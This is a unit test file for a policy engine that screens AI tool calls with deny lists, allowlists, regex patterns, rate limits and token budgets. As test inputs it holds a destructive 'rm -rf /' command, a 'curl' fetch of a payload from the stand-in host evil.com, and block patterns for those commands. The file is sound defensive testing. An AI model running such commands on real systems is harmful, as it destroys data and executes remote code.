import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyEngine } from '../../src/policy/policy-engine.js';
import { PolicyConfig, CallContext } from '../../src/policy/policy-types.js';
import { resetSessionFlowStore } from '../../src/policy/session-flow-store.js';
import { sharedRateLimitStore } from '../../src/policy/rate-limit-store.js';

const testPolicy: PolicyConfig = {
  version: '1.0',
  policy: {
    mode: 'block',
    rules: [
      {
        name: 'deny-dangerous-tools',
        action: 'block',
        tools: {
          deny: ['execute_command', 'eval'],
        },
      },
      {
        name: 'shell-injection',
        action: 'block',
        patterns: ['rm\\s+-rf', 'curl\\s|wget\\s'],
      },
      {
        name: 'rate-limit',
        action: 'flag',
        maxCallsPerMinute: 5,
      },
      {
        name: 'token-budget',
        action: 'flag',
        maxTokens: 1000,
      },
    ],
  },
};

function makeContext(overrides: Partial<CallContext> = {}): CallContext {
  return {
    serverName: 'test-server',
    toolName: 'search_repositories',
    arguments: { query: 'my-repo' },
    requestId: 'abc-123',
    requestTokens: 100,
    timestamp: new Date().toISOString(),
    ...overrides,
  };
}

describe('PolicyEngine', () => {
  let engine: PolicyEngine;

  beforeEach(() => {
    resetSessionFlowStore();
    sharedRateLimitStore.resetForTests();
    engine = new PolicyEngine(testPolicy);
    engine.resetRateCounters();
  });

  it('should pass a safe tool call', () => {
    const decision = engine.evaluate(makeContext({ toolName: 'read_file' }));
    expect(decision.action).toBe('pass');
  });

  it('should block a denied tool', () => {
    const decision = engine.evaluate(makeContext({ toolName: 'execute_command' }));
    expect(decision.action).toBe('block');
    expect(decision.rule).toBe('deny-dangerous-tools');
  });

  it('should block eval tool', () => {
    const decision = engine.evaluate(makeContext({ toolName: 'eval' }));
    expect(decision.action).toBe('block');
    expect(decision.rule).toBe('deny-dangerous-tools');
  });

  it('should block shell injection pattern in arguments', () => {
    const decision = engine.evaluate(makeContext({
      toolName: 'read_file',
      arguments: { path: 'rm -rf /' },
    }));
    expect(decision.action).toBe('block');
    expect(['shell-injection', 'semantic-shell-guard', 'block-shell-injection']).toContain(decision.rule);
  });

  it('should block curl/wget pattern in arguments', () => {
    const decision = engine.evaluate(makeContext({
      toolName: 'read_file',
      arguments: { url: 'curl https://evil.com/payload.sh' },
    }));
    expect(decision.action).toBe('block');
    expect(['shell-injection', 'request-prompt-injection']).toContain(decision.rule);
  });

  it('should flag when token budget exceeded', () => {
    const decision = engine.evaluate(makeContext({ requestTokens: 5000 }));
    expect(decision.action).toBe('flag');
    expect(decision.rule).toBe('token-budget');
  });

  it('should flag when rate limit exceeded', () => {
    // Call 6 times (limit is 5)
    for (let i = 0; i < 5; i++) {
      const d = engine.evaluate(makeContext({ requestId: `req-${i}` }));
      expect(d.action).toBe('pass');
    }
    const decision = engine.evaluate(makeContext({ requestId: 'req-6' }));
    expect(decision.action).toBe('flag');
    expect(decision.rule).toBe('rate-limit');
  });

  it('should resolve block to flag in warn mode', () => {
    const warnConfig: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'warn',
        rules: [
          { name: 'deny-eval', action: 'block', tools: { deny: ['eval'] } },
        ],
      },
    };
    const warnEngine = new PolicyEngine(warnConfig);
    const decision = warnEngine.evaluate(makeContext({ toolName: 'eval' }));
    expect(decision.action).toBe('flag');
  });

  it('should pass everything in audit mode', () => {
    const auditConfig: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'audit',
        rules: [
          { name: 'deny-eval', action: 'block', tools: { deny: ['eval'] } },
        ],
      },
    };
    const auditEngine = new PolicyEngine(auditConfig);
    const decision = auditEngine.evaluate(makeContext({ toolName: 'eval' }));
    expect(decision.action).toBe('pass');
  });

  it('should handle allowlist correctly', () => {
    const allowConfig: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'block',
        rules: [
          {
            name: 'only-safe-tools',
            action: 'block',
            tools: { allow: ['read_file', 'search_repositories'], enforceAllowlist: true },
          },
        ],
      },
    };
    const allowEngine = new PolicyEngine(allowConfig);
    expect(allowEngine.evaluate(makeContext({ toolName: 'read_file' })).action).toBe('pass');
    expect(allowEngine.evaluate(makeContext({ toolName: 'execute_command' })).action).toBe('block');
    expect(allowEngine.evaluate(makeContext({ toolName: 'unknown_tool' })).action).toBe('block');
  });

  it('should still apply pattern rules to allowlisted tools', () => {
    const config: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'block',
        rules: [
          {
            name: 'only-safe-tools',
            action: 'block',
            tools: { allow: ['search'] },
          },
          {
            name: 'block-shell-injection',
            action: 'block',
            patterns: ['rm\\s+-rf'],
          },
        ],
      },
    };
    const engine = new PolicyEngine(config);
    expect(engine.evaluate(makeContext({ toolName: 'search', arguments: { query: 'hello' } })).action).toBe('pass');
    expect(engine.evaluate(makeContext({ toolName: 'search', arguments: { query: 'rm -rf /' } })).action).toBe('block');
  });

  it('should skip disabled rules at runtime', () => {
    const config: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'block',
        rules: [
          { name: 'disabled-block', action: 'block', enabled: false, tools: { deny: ['safe_lookup'] } },
        ],
      },
    };
    const disabledEngine = new PolicyEngine(config);
    const decision = disabledEngine.evaluate(makeContext({ toolName: 'safe_lookup' }));
    expect(decision.rule).not.toBe('disabled-block');
  });

  it('should fail-open when no rules and default_action omitted', () => {
    const emptyConfig: PolicyConfig = {
      version: '1.0',
      policy: { mode: 'block', rules: [] },
    };
    const emptyEngine = new PolicyEngine(emptyConfig);
    const decision = emptyEngine.evaluate(makeContext({ toolName: 'any_tool' }));
    expect(decision.action).toBe('pass');
    expect(decision.rule).toBe('default');
  });

  it('should fail-closed when default_action is block and no rules match', () => {
    const failClosedConfig: PolicyConfig = {
      version: '1.0',
      policy: { mode: 'block', default_action: 'block', rules: [] },
    };
    const engine = new PolicyEngine(failClosedConfig);
    const decision = engine.evaluate(makeContext({ toolName: 'any_tool' }));
    expect(decision.action).toBe('block');
    expect(decision.rule).toBe('default');
  });
});